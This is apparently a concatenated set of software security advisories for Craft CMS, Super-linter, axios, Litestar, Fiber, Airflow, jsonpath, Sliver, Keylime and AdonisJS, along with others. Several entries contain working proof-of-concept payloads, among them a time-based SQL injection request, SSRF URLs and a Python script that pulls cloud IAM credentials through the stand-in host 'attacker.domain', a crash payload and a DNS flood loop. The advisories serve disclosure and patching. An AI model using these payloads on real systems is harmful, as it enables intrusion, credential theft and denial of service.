$'{\\\"context\\\":\\\"index\\\",\\\"elementType\\\":\\\"craft\\\\\\\\elements\\\\\\\\User\\\",\\\"source\\\":\\\"*\\\",\\\"baseCriteria\\\":{\\\"siteId\\\":1},\\\"criteria\\\":{\\\"limit\\\":100,\\\"orderBy\\\": \\\"(elements.id) DESC, (SELECT SLEEP(0.2)) --\\\"},\\\"viewState\\\":{\\\"static\\\":false}}' $'http://craft.local/index.php?p=admin%2Factions%2Felement-indexes%2Fget-elements'\n```\n\n### Impact\n\nWith this Blind SQLi, an attacker can:\n- **Exfiltrate data** character-by-character.\n- **Modify or destroy data** (drop tables, update records, alter schema).\n\n### Root Cause\nThe `orderBy` parameter is not validated or sanitized.

While the implemented defense mechanisms are an improvement, I have identified two methods to bypass these protections. This report details the first bypass method involving alternative IP notation, while the second method will be submitted in a separate advisory.\n\n---\n## Summary\n\nThe `saveAsset` GraphQL mutation uses `filter_var(..., FILTER_VALIDATE_IP)` to block a specific list of IP addresses. However, alternative IP notations (hexadecimal, mixed) are not recognized by this function, allowing attackers to bypass the blocklist and access cloud metadata services.\n\n---\n## Proof of Concept\n1. Send the following GraphQL mutation:\n```graphql\nmutation {\n    save_images_Asset(_file: { \n        url: \"http://169.254.0xa9fe/latest/meta-data/\"\n        filename: \"metadata.txt\"\n    }) {\n        id\n    }\n}\n```\n2. The IP validation passes (hex notation not recognized as IP)\n3. Guzzle resolves `169.254.0xa9fe` to `169.254.169.254`\n4. Cloud metadata is fetched and saved\n\n### Alternative Payloads\n| Payload | Notation | Resolves To |\n|---------|----------|-------------|\n| `http://169.254.0xa9fe/` | Mixed (decimal + hex) | 169.254.169.254 |\n| `http://0xa9.0xfe.0xa9.0xfe/` | Full hex dotted | 169.254.169.254 |\n| `http://0xa9fea9fe/` | Single hex integer | 169.254.169.254 |\n\n---\n## Technical Details\n\n**File:** `src/gql/resolvers/mutations/Asset.php`\n**Root Cause:** `filter_var($hostname, FILTER_VALIDATE_IP)` only recognizes standard dotted-decimal notation. Hex representations bypass this check, but Guzzle still resolves them.\n\n```php\n// Line 287 - Fails to catch hex notation\nfilter_var($hostname, FILTER_VALIDATE_IP)\n```",

(Url must use a domain, not a raw IP.)\n- Attacker sets up domain attacker.domain with an A record of something like 169.254.169.254 (special AWS metadata IP)\n- Attacker invokes save_images_Asset with url: http://attacker.domain/latest/meta-data/iam/security-credentials and filename \"foo.txt\"\n- Craft fetches sensitive information on attacker's behalf, and makes it available for download at /assets/images/foo.txt\n- Normal checks to verify that image is valid are bypassed because of .txt extension\n- Normal checks to verify that url is not an IP address are bypassed because user provided a valid domain that resolves to a sensitive internal IP address\n\n### Details\n\nhandleUpload() in src/gql/resolvers/mutations/Assets.php contains the code that processes the save_images_Asset mutation.\n\nIt has some basic validation logic for the url parameter (source of the image) and filename parameter (what to save image as):\n\n```\n   } elseif (!empty($fileInformation['url'])) {\n            $url = $fileInformation['url'];\n\n            // make sure the hostname is alphanumeric and not an IP address\n            $hostname = parse_url($url, PHP_URL_HOST);\n            if (\n                !filter_var($hostname, FILTER_VALIDATE_DOMAIN, FILTER_FLAG_HOSTNAME) ||\n                filter_var($hostname, FILTER_VALIDATE_IP)\n            ) {\n                throw new UserError(\"$url contains an invalid hostname.\");\n            }\n\n            if (empty($fileInformation['filename'])) {\n                $filename = AssetsHelper::prepareAssetName(pathinfo(UrlHelper::stripQueryString($url), PATHINFO_BASENAME));\n            } else {\n                $filename = AssetsHelper::prepareAssetName($fileInformation['filename']);\n            }\n\n            $extension = strtolower(pathinfo($filename, PATHINFO_EXTENSION));\n            if (is_array($allowedExtensions) && !in_array($extension, $allowedExtensions, true)) {\n                throw new AssetDisallowedExtensionException(Craft::t('app', \"“{$extension}” is not an allowed file extension.\"));\n            }\n```\n\nThe upshot of this validation is that url must contain a hostname, not an IP, and filename must contain an allowed extension.  If the allowed extension is a typical image extension, further validation will be done downstream  to verify that the downloaded content is in fact an image.\n\nAn authenticated attacker can trick this mutation into fetching sensitive AWS metadata, or other sensitive information from the craft instance's internal network.\n\n- First, the attacker must register a domain -- e.g. attacker.domain.  \n- Next, they must point their domain at the sensitive internal ip they'd like to access (e.g. 169.254.169.254)\n- Next, they make a request to save_images_Asset with url set to http://attacker.domain/sensitive/path with filename set to \"something.txt\"\n- Finally the attacker makes a http request to retrieve /assets/images/something.txt, which contains sensitive information\n\n\n### PoC\n\n#### Preconditions\n\n- Graphql access must be enabled\n- Attacker must have access to a graphql token\n- Token must be configured to have access to save_images_Asset mutation\n- Attacker must have configured a domain, \"attacker.domain\" pointing to the sensitive internal IP address they'd like to access\n- .txt must be an allowed extension for uploads via save_images_Asset (as it is by default)\n\n#### Code\n\n```\nimport requests\n\n# Replace GRAPHQL_ENDPOINT and BEARER_TOKEN per target.\nGRAPHQL_ENDPOINT = 'http://localhost:8080/actions/graphql/api'\nTOKEN = '<TOKEN HERE>'\n\nmutation = '''\nmutation SaveAsset($_file: FileInput!, $title: String, $focalPoint: String) { save_images_Asset(_file: $_file,\n   title: $title, focalPoint: $focalPoint) { id title url filename focalPoint dateCreated } }\n'''\n\nvariables = {\n  '_file': {\n    'url' : \"http://attacker.domain/latest/meta-data/iam/security-credentials\",\n    'filename': 'foo.txt'\n\n  },\n  \"title\": \"my photo\",\n  \"focalPoint\": \"0.5;0.5\"\n\n}\n\nresp = requests.post(GRAPHQL_ENDPOINT,\n                     json={'query': mutation, 'variables': variables},\n                     headers={'Authorization': f'Bearer {TOKEN}'})\nprint(resp.status_code, resp.text)\n```\n\nIf attack is successful, response to running this script will be something like:\n\n```\n200 {\"data\":{\"save_images_Asset\":{\"id\":\"211403\",\"title\":\"my photo\",\"url\":\"http://localhost:8080/assets/volumes/images/foo.txt\",\"filename\":\"foo.txt\",\"focalPoint\":null,\"dateCreated\":\"2025-12-18T09:45:24-08:00\"}}}\n```\n\nAttacker can then download sensitive data by fetching http://localhost:8080/assets/volumes/images/foo.txt\n\n\n### Impact\n\nImpacted users must:\n\n- Have graphql enabled\n- Have a graphql token created with permissions to use save_images_Asset\n- Have graphql token stolen by attacker or abused by malicious insider\n\nImpact is heightened if:\n\n- craft is running on something like an AWS EC2 instance, which has a well-known, sensitive internal http address that can be accessed to fetch metadata.  \n\nUltimate result is:\n\nAttacker or malicious insider gets access to infrastructure craft is running on, not just craft itself.",

When this action is used in downstream GitHub Actions workflows, an attacker can submit a pull request that introduces a file whose **name** contains shell command substitution syntax, such as `$(...)`. In affected Super-linter versions, runtime scripts may execute the embedded command during file discovery processing, enabling arbitrary command execution in the workflow runner context. This can be used to disclose the job’s `GITHUB_TOKEN` depending on how the workflow configures permissions.\n\n### Details\n\nThe issue appears originates in the logic that scans the repository for changed files to check.\n\n1. Use a workflow that runs Super-linter on `pull_request` events.\n2. Open a pull request that adds a new file with a crafted filename containing command substitution and an outbound request that includes `$GITHUB_TOKEN`.\n3. Run the workflow.  \n\n### Impact\n\n- **Arbitrary command execution** in the context of the workflow run that invokes Super-linter (triggered by attacker-controlled filenames in a PR).\n- **Credential exposure / misuse:** the injected command can read environment variables available to the action, including `GITHUB_TOKEN`.\n\nThe level of exposure depends on the source of the pull request.\n\nTo actively exploit the vulnerability, an attacker needs have the ability to run workflows without any [approval from the repository admin](https://docs.github.com/en/actions/how-tos/manage-workflow-runs/approve-runs-from-forks).\n\nAlso, the `GITHUB_TOKEN` needs to have unconstrained access to repository resources. Even in that case, for pull request coming from forked repositories, no secrets are passed to the forked repository when running workflows triggered by `pull_request` events, and the `GITHUB_TOKEN` drops and write permission on the source repository [source](https://docs.github.com/en/actions/reference/workflows-and-actions/events-that-trigger-workflows#workflows-in-forked-repositories).\n\nFinally, although not specific to this vulnerability, we recommend auditing `workflow_call` and `pull_request_target` workflows because they can lead to compromise, regardless of whether you're using Super-linter, or not, as [explained by this GitHub Enterprise doc](https://docs.github.com/en/enterprise-cloud@latest/actions/reference/security/secure-use#mitigating-the-risks-of-untrusted-code-checkout).",

The expression `mergeMap[prop] || mergeDeepProperties` evaluates to `Object.prototype`\n5. `Object.prototype(...)` throws `TypeError: merge is not a function`\n\nThe `mergeConfig` function is called by:\n\n- `Axios._request()` at `lib/core/Axios.js:75`\n- `Axios.getUri()` at `lib/core/Axios.js:201`\n- All HTTP method shortcuts (`get`, `post`, etc.) at `lib/core/Axios.js:211,224`\n\n### PoC\n\n```javascript\nimport axios from \"axios\";\n\nconst maliciousConfig = JSON.parse('{\"__proto__\": {\"x\": 1}}');\nawait axios.get(\"https://httpbin.org/get\", maliciousConfig);\n```\n\n**Reproduction steps:**\n\n1. Clone axios repository or `npm install axios`\n2. Create file `poc.mjs` with the code above\n3. Run: `node poc.mjs`\n4. Observe the TypeError crash\n\n**Verified output (axios 1.13.4):**\n\n```\nTypeError: merge is not a function\n    at computeConfigValue (lib/core/mergeConfig.js:100:25)\n    at Object.forEach (lib/utils.js:280:10)\n    at mergeConfig (lib/core/mergeConfig.js:98:9)\n```\n\n**Control tests performed:**\n| Test | Config | Result |\n|------|--------|--------|\n| Normal config | `{\"timeout\": 5000}` | SUCCESS |\n| Malicious config | `JSON.parse('{\"__proto__\": {\"x\": 1}}')` | **CRASH** |\n| Nested object | `{\"headers\": {\"X-Test\": \"value\"}}` | SUCCESS |\n\n**Attack scenario:**\nAn application that accepts user input, parses it with `JSON.parse()`, and passes it to axios configuration will crash when receiving the payload `{\"__proto__\": {\"x\": 1}}`.\n\n### Impact\n\n**Denial of Service** - Any application using axios that processes user-controlled JSON and passes it to axios configuration methods is vulnerable. The application will crash when processing the malicious payload.\n\nAffected environments:\n\n- Node.js servers using axios for HTTP requests\n- Any backend that passes parsed JSON to axios configuration\n\nThis is NOT prototype pollution - the application crashes before any assignment occurs.",

Specifically, outbound traffic using the `sendto`, `sendmsg`, and `sendmmsg` socket system calls can bypass detection and logging when using `egress-policy: audit`. \n\n**Note:** This vulnerability only affects audit mode. When using `egress-policy: block`, these connections are properly blocked. It requires the attacker to already have code execution capabilities within the GitHub Actions workflow (e.g., through workflow injection or compromised dependencies)\n\n## Affected Versions \n\n- Harden-Runner Community Tier: All versions prior to v2.14.2 \n- Harden-Runner Enterprise Tier: **NOT AFFECTED** \n\n## Severity \n\n**Medium** - This vulnerability affects audit logging capabilities but requires the attacker to already have code execution within the workflow. \n\n## Impact \n\nWhen Harden-Runner is configured in audit mode (`egress-policy: audit`), attackers with the ability to execute arbitrary code in a workflow can: \n- Send outbound network traffic without generating audit logs \n- Bypass network monitoring for UDP-based communications \n\n**Important:** This vulnerability requires the attacker to already have code execution capabilities within the GitHub Actions workflow (e.g., through workflow injection or compromised dependencies). \n\n## Technical Details \n\nThe vulnerability stems from incomplete monitoring coverage of certain socket-related system calls. Specifically, the following system calls can be used to send UDP traffic without triggering audit events: \n\n- `sendto()` \n\n- `sendmsg()` \n\n- `sendmmsg()` \n\nAn attacker with code execution in a workflow can compile and execute native code that uses these system calls to establish covert communication channels. \n\n## Affected Users \n\n**This vulnerability ONLY affects users of the Harden-Runner Community Tier.** \n\nThe Harden-Runner Enterprise Tier is **NOT vulnerable** to this bypass technique. \n\n## Remediation \n\n### For Community Tier Users \n \n**Upgrade to Harden-Runner v2.14.2 or later.** This version includes fixes for the logging bypass vulnerability. \n\n### For Enterprise Tier Users \n\nNo action required. Enterprise tier customers are not affected by this vulnerability. \n\n## Credit \n\nWe would like to thank [Devansh Batham](https://github.com/devanshbatham) for responsibly disclosing this vulnerability through our security reporting process. Devansh was communicative throughout the process and verified the fix before the fix before it was made public.",

An allowed origin like https://good.example can match https://goodXexample, resulting in Access-Control-Allow-Origin being set for an untrusted origin\n\n### Details\nCORSConfig.allowed_origins_regex is constructed using a regex built from configured allowlist values and used with fullmatch() for validation. Because metacharacters are not escaped, a malicious origin can match unexpectedly. The check relies on allowed_origins_regex.fullmatch(origin).\n\n### PoC\nServer (poc_cors_server.py)\n\n```\nfrom litestar import Litestar, get\nfrom litestar.config.cors import CORSConfig\n\n@get(\"/c\")\nasync def c() -> str:\n    return \"ok\"\n\ncors = CORSConfig(\n    allow_origins=[\"https://good.example\"],\n    allow_credentials=True,\n)\napp = Litestar([c], cors_config=cors)\n```\n\n`uvicorn poc_cors_server:app --host 127.0.0.1 --port 8002`\n\nClient (poc_cors_client.py)\n\n```\nimport http.client\n\ndef req(origin: str) -> tuple[int, str | None]:\n    c = http.client.HTTPConnection(\"127.0.0.1\", 8002, timeout=3)\n    c.request(\"GET\", \"/c\", headers={\"Origin\": origin, \"Host\": \"example.com\"})\n    r = c.getresponse()\n    r.read()\n    acao = r.getheader(\"Access-Control-Allow-Origin\")\n    c.close()\n    return r.status, acao\n\nprint(\"evil:\", req(\"https://evil.example\"))\nprint(\"bypass:\", req(\"https://goodXexample\")) \n```\n\nExpected (vulnerable behavior):\n\nOrigin: https://evil.example → no ACAO\nOrigin: https://goodXexample → ACAO: https://goodxexample/ (bypass)\n\n### Impact\nType: CORS policy bypass (cross-origin data exposure risk)\nWho is impacted: apps using CORS allowlists to restrict browser cross-origin reads.

On **Go versions prior to 1.24**, the underlying `crypto/rand` implementation **can return an error** if secure randomness cannot be obtained. In such cases, these Fiber v2 UUID functions silently fall back to generating predictable values — the all-zero UUID `00000000-0000-0000-0000-000000000000`.\n\nOn Go **1.24+**, the language guarantees that `crypto/rand` no longer returns an error (it will block or panic instead), so this vulnerability primarily affects **Fiber v2 users running Go 1.23 or earlier**, which Fiber v2 officially supports.\n\nBecause no error is returned by the Fiber v2 UUID functions, application code may unknowingly rely on *predictable, repeated, or low-entropy identifiers* in security-critical pathways. This is especially impactful because many Fiber v2 middleware components (session middleware, CSRF, rate limiting, request-ID generation, etc.) **default to using `utils.UUIDv4()`**.\n\nImpact includes, but is not limited to:\n\n* **Session fixation or hijacking** (predictable session IDs)\n* **CSRF token forgery** or bypass\n* **Authentication replay / token prediction**\n* **Potential denial-of-service (DoS):** if the zero UUID is generated, key-based structures (sessions, rate-limits, caches, CSRF stores) may collapse into a single shared key, causing overwrites, lock contention, or state corruption\n* **Request-ID collisions**, undermining logging and trace integrity\n* **General compromise** of confidentiality, integrity, and authorization logic relying on UUIDs for uniqueness or secrecy\n\nAll Fiber v2 versions containing the internal `utils.UUIDv4()` / `utils.UUID()` implementation are affected when running on **Go <1.24**. **No patched Fiber v2 release currently exists.**\n\n---\n\n## Suggested Mitigations / Workarounds\n\nUpdate to the latest version of Fiber v2.\n\n---\n\n### Likelihood / Environmental Factors\n\nIt’s important to note that **entropy exhaustion on modern Linux systems is extremely rare**, as the kernel’s CSPRNG is resilient and non-blocking. However, **entropy-source failures** — where `crypto/rand` cannot read from its underlying provider — are significantly more likely in certain environments.\n\nThis includes containerized deployments, restricted sandboxes, misconfigured systems lacking read access to `/dev/urandom` or platform-equivalent sources, chrooted or jailed environments, embedded devices, or systems with non-standard or degraded randomness providers. On **Go <1.24**, such failures cause `crypto/rand` to return an error, which the Fiber v2 UUID functions currently treat as a signal to silently generate predictable UUIDs, including the zero UUID. This silent fallback is the root cause of the vulnerability.\n\n---\n\n## References\n\n* Upstream advisory for `gofiber/utils`: **GHSA-m98w-cqp3-qcqr**\n* Source repositories:\n\n  * `github.com/gofiber/fiber`\n  * `github.com/gofiber/utils`\n\n---\n\n## Credits / Reporter\n\nReported by **@sixcolors** (Fiber Maintainer / Security Team)",

          "html": "## Vulnerability Overview\n\nAn authorization bypass vulnerability exists in Apache Airflow that allows authenticated users to access task execution logs without the required permissions.\n\n## The Flaw\n\nThe vulnerability affects environments using custom roles or granular permission settings. Normally, Airflow allows administrators to separate \"Task\" access (viewing the task state) from \"Task Log\" access (viewing the console output/logs).\n\nIn affected versions, the permission check for retrieving logs is insufficient. An authenticated user who has been granted access to view Tasks can successfully request and view Task Logs, even if they do not have the specific `can_read` permission for Logs.\n\n## Impact\n\n- **Confidentiality Loss:** Task logs often contain sensitive operational data, debugging information, or potentially leaked secrets (environment variables, connection strings) that should not be visible to all users with basic task access.\n- **Broken Access Control:** This bypasses the intended security model for restricted user roles.\n\n## Affected Versions\n\n- Apache Airflow 3.1.0 through 3.1.6\n\n## Patches\n\nUsers should upgrade to Apache Airflow **3.1.7** or later, which enforces the correct permission checks for log access.",

The library relies on the `static-eval` module to evaluate JSON Path expressions but fails to properly sanitize or sandbox the input.\n\nThis allows an attacker to inject arbitrary JavaScript code into the JSON Path expression. When the library evaluates this expression, the malicious code is executed.\n\n* **Node.js Environments:** This leads to **Remote Code Execution (RCE)**, allowing an attacker to compromise the server.\n* **Browser Environments:** This leads to **Cross-Site Scripting (XSS)**, allowing an attacker to hijack user sessions or exfiltrate data.\n\n**Affected Methods:**\n\nThe vulnerability triggers when untrusted data is passed to any method that evaluates a path, including:\n\n* `jsonpath.query`\n* `jsonpath.nodes`\n* `jsonpath.paths`\n* `jsonpath.value`\n* `jsonpath.parent`\n* `jsonpath.apply`\n\n### Patches\n\n**No Patch Available:**\n\nCurrently, **all versions** of `jsonpath` are vulnerable. There is no known patched version of this package that resolves the issue while retaining the current architecture.\n\n**Recommendation:**\n\nDevelopers are strongly advised to **migrate to a secure alternative** (such as `jsonpath-plus` or similar libraries that do not use `eval`/`static-eval`) or strictly validate all JSON Path inputs against a known allowlist.\n\n### Workarounds\n\n* **Strict Input Validation:** Ensure that no user-supplied data is ever passed directly to `jsonpath` functions.\n* **Sanitization:** If user input is unavoidable, implement a strict parser to reject any JSON Path expressions containing executable JavaScript syntax (e.g., parentheses `()`, script expressions `script:`, or function calls).\n\n### Resources\n\n* [CVE-2026-1615](https://nvd.nist.gov/vuln/detail/CVE-2026-1615)\n* [Vulnerable Code in handlers.js](https://github.com/dchester/jsonpath/blob/c1dd8ec74034fb0375233abb5fdbec51ac317b4b/lib/handlers.js#L243)\n* [Snyk Advisory (Java/WebJars)](https://security.snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-15141219)\n* [Snyk Advisory (JS)](https://security.snyk.io/vuln/SNYK-JS-JSONPATH-13645034)",

Send repeated DNS queries with a minimal protobuf message of type `TOTP`.\n2. Observe repeated session allocation/issuance behavior.\n3. Continue requests to increase active in-memory session state.\n\n### Example\n```bash\nwhile true; do\n  dig +short @<DNS_C2_IP> baa8.<parent-domain> A >/dev/null\ndone\n```\n\n`baa8` is a base32 payload for a minimal TOTP-type protobuf message.\n\n### Observable Indicators\n- Repeated bootstrap/session-allocation log entries from `handleHello`\n- Rising memory usage in the Sliver server process\n- Service slowdown or instability under sustained request volume\n\n## Impact\n- Unauthenticated remote denial of service (availability)\n- Resource exhaustion through unbounded session growth in DNS bootstrap path\n- Estimated CVSS v3.1: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H` (**7.5 High**)",

The registrar's TLS context is configured with `ssl.CERT_OPTIONAL` instead of `ssl.CERT_REQUIRED`, allowing any client to connect to protected API endpoints without presenting a valid client certificate.\n\n**Who is impacted:**\n  - All Keylime deployments running versions 7.12.0 through 7.13.0\n  - Environments where the registrar HTTPS port (default 8891) is network-accessible to untrusted clients\n\n**What an attacker can do:**\n  - **List all registered agents** (`GET /v2/agents/`) - enumerate the entire agent inventory\n  - **Retrieve agent details** (`GET /v2/agents/{uuid}`) - obtain public TPM keys, certificates, and network locations (IP/port) of any agent\n  - **Delete any agent** (`DELETE /v2/agents/{uuid}`) - remove agents from the registry, disrupting attestation services\n\nNote: The exposed TPM data (EK, AK, certificates) consists of public keys and certificates. Private keys remain protected within TPM hardware. The HMAC secret used for challenge-response validation is stored in the database but is not exposed via the API.\n\n**Affected versions:** >= 7.12.0, <= 7.13.0\n\n**Fixed versions:** 7.12.2, >= 7.13.1\n\n### Patches\n\nA patch for the affected released versions is available. It removes the line that override the configuration of `ssl.verify_mode`, leaving the `CERT_REQUIRED` value set by `web_util.init_mtls()`:\n\n```diff\ndiff --git a/keylime/web/base/server.py b/keylime/web/base/server.py\nindex 1d9a9c2..859b23a 100644\n--- a/keylime/web/base/server.py\n+++ b/keylime/web/base/server.py\n@@ -2,7 +2,6 @@ import asyncio\n import multiprocessing\n from abc import ABC, abstractmethod\n from functools import wraps\n-from ssl import CERT_OPTIONAL\n from typing import TYPE_CHECKING, Any, Callable, Optional\n\n import tornado\n@@ -252,7 +251,6 @@ class Server(ABC):\n         self._https_port = config.getint(component, \"tls_port\", fallback=0)\n         self._max_upload_size = config.getint(component, \"max_upload_size\", fallback=104857600)\n         self._ssl_ctx = web_util.init_mtls(component)\n-        self._ssl_ctx.verify_mode = CERT_OPTIONAL\n\n     def _get(self, pattern: str, controller: type[\"Controller\"], action: str, allow_insecure: bool = False) -> None:\n         \"\"\"Creates a new route to handle incoming GET requests issued for paths which match the given\n```\n\nUsers should upgrade to the patched version once it is released.\n\n### Workarounds\n\nIf upgrading is not immediately possible, apply one of the following mitigations:\n\n#### 1. Network isolation (Recommended)\n\nRestrict access to the registrar HTTPS port (default 8891) using firewall rules\nto allow only trusted hosts (verifier, tenant):\n\n##### Example using iptables\n```\niptables -A INPUT -p tcp --dport 8891 -s <verifier_ip> -j ACCEPT\niptables -A INPUT -p tcp --dport 8891 -s <tenant_ip> -j ACCEPT\niptables -A INPUT -p tcp --dport 8891 -j DROP\n```\n\n#### 2. Reverse proxy with mTLS enforcement\n\nDeploy a reverse proxy (nginx, HAProxy) in front of the registrar that enforces client certificate authentication:\n\n##### Example nginx configuration\n```\nserver {\n    listen 8891 ssl;\n    ssl_certificate /path/to/server.crt;\n    ssl_certificate_key /path/to/server.key;\n    ssl_client_certificate /path/to/ca.crt;\n    ssl_verify_client on;  # Enforce client certificates\n\n    location / {\n        proxy_pass https://localhost:8892;  # Internal registrar port\n    }\n}\n```",

In affected versions, it uses a parsing function that calls `panic` if the value cannot be parsed as a relationship. \n\n## Fix\nThis issue was fixed in https://github.com/authzed/spicedb/pull/2878.\n\n## Remediations\n* Prevent client control of the `optional_cursor` field in `LookupResources` calls\n* Upgrade to an unaffected version",

When processing file uploads, the multipart parser may accumulate an unbounded amount of data in memory while attempting to detect file types, potentially leading to excessive memory consumption and process termination.\n\nThis issue affects applications that accept `multipart/form-data` uploads using affected versions of `@adonisjs/bodyparser`.\n\n### Details\n\nAdonisJS parses `multipart/form-data` requests using the BodyParser package. During file uploads, the multipart parser attempts to detect the uploaded file type by accumulating incoming chunks in an internal buffer to perform magic number detection.\n\nThe internal buffer used for this detection does not enforce a maximum size and is not protected by a timeout or early termination condition. If the uploaded data does not match any supported file signatures, the buffer continues to grow as more chunks are received.\n\nWhen certain configurations are used, such as deferred validations or permissive file size limits, this buffering behavior may persist for the duration of the upload stream.\n\n### Impact\n\nExploitation requires a reachable endpoint that accepts multipart file uploads.\n\nAn attacker can send a specially crafted multipart request containing a large or unbounded stream of data that does not match known file signatures. This may cause the server to continuously allocate memory until the Node.js process exhausts available RAM and terminates due to an out-of-memory condition.\n\nThis results in a Denial of Service, making the application unavailable to legitimate users. Authentication is not required if the upload endpoint is publicly accessible.\n\n### Patches\n\nFixes targeting v6 and v7 have been published below.\n\nUsers should upgrade to a version that includes the following fix:\n- https://github.com/adonisjs/bodyparser/releases/tag/v10.1.3\n- https://github.com/adonisjs/bodyparser/releases/tag/v11.0.0-next.9",
